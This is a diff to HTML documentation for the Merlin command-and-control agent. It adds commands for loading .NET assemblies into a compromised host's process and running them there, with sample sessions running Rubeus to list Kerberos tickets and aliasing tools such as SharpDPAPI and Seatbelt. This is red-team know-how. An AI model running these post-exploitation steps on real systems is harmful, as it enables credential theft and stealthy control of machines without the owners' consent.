@@ -120,8 +120,11 @@
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#info">info</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#invoke-assembly">invoke-assembly</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#jobs">jobs</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#kill">kill</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#list-assemblies">list-assemblies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#load-assembly">load-assembly</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#ls">ls</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#main">main</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#nslookup">nslookup</a></li>
@@ -258,10 +261,19 @@
                     |                                | RtlCreateUserThread &lt;pid&gt;
   info              | Display all information about  |
                     | the agent                      |
+  invoke-assembly   | Invoke, or execute, a .NET     | &lt;assembly name&gt;, &lt;assembly
+                    | assembly that was previously   | args&gt;
+                    | loaded into the agent&#39;s        |
+                    | process                        |
   jobs              | Display all active jobs for    |
                     | the agent                      |
   kill              | Instruct the agent to die or   |
                     | quit                           |
+  load-assembly     | Load a .NET assembly into the  | &lt;assembly path&gt; [&lt;assembly
+                    | agent&#39;s process                | name&gt;]
+  list-assemblies   | List the .NET assemblies that  |
+                    | are loaded into the agent&#39;s    |
+                    | process                        |
   ls                | List directory contents        | ls /etc OR ls C:\\Users OR ls
                     |                                | C:/Users
   main              | Return to the main menu        |
@@ -571,6 +583,39 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRnt
 </pre></div>
 </div>
 </div>
+<div class="section" id="invoke-assembly">
+<h2>invoke-assembly<a class="headerlink" href="#invoke-assembly" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">invoke-assembly</span></code> command will execute a .NET assembly that was previously loaded into the agent with the
+<a class="reference internal" href="#load-assembly">load-assembly</a> command. The first argument is the name of the assembly and all the remaining arguments are passed to
+the assembly for execution. Use the <a class="reference internal" href="#list-assemblies">list-assemblies</a> command return a list of loaded assemblies.
+The <a class="reference internal" href="#execute-assembly">execute-assembly</a> command is different because it uses injection to run the assembly in a child process.
+This command runs the assembly in the current process without injection.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
+</div>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly Rubeus.exe klist
+[-] Created job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+[-] Results job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+[+]
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+Action: List Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x37913
+</pre></div>
+</div>
+</div>
 <div class="section" id="jobs">
 <h2>jobs<a class="headerlink" href="#jobs" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">jobs</span></code> command will display a table of all active jobs assigned to the agent. The output will not include jobs that have already completed.</p>
@@ -589,6 +634,47 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRnt
 <p>The <code class="docutils literal notranslate"><span class="pre">kill</span></code> control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -&gt; control -&gt; &lt;agent ID&gt; -&gt; kill. This is the shortest way to quickly kill an agent.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill
 Merlin» [-]Created job goaRNhTVTT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+</pre></div>
+</div>
+</div>
+<div class="section" id="list-assemblies">
+<h2>list-assemblies<a class="headerlink" href="#list-assemblies" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">list-assemblies</span></code> command lists .NET assemblies that have been loaded into the agent’s process with the <a class="reference internal" href="#load-assembly">load-assembly</a> command.</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
+[-] Created job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+[-] Results job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+[+] Loaded Assemblies:
+seatbelt.exe
+rubeus.exe
+sharpdpapi.exe
+sharpup.exe
+Hagrid
+</pre></div>
+</div>
+</div>
+<div class="section" id="load-assembly">
+<h2>load-assembly<a class="headerlink" href="#load-assembly" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">load-assembly</span></code> command loads a .NET assembly into the agent’s process. Once the assembly is loaded, it can be executed
+multiple times with the <a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command. The .NET assembly is only sent across the wire one time.
+An option third argument can be provided to reference the assembly as any other name when executed with the
+<a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
+</div>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe
+[-] Created job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+[-] Results job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+[+] successfully loaded rubeus.exe into the default AppDomain
+</pre></div>
+</div>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe Hagrid
+[-] Created job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+[-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+[+] successfully loaded Hagrid into the default AppDomain
 </pre></div>
 </div>
 </div>
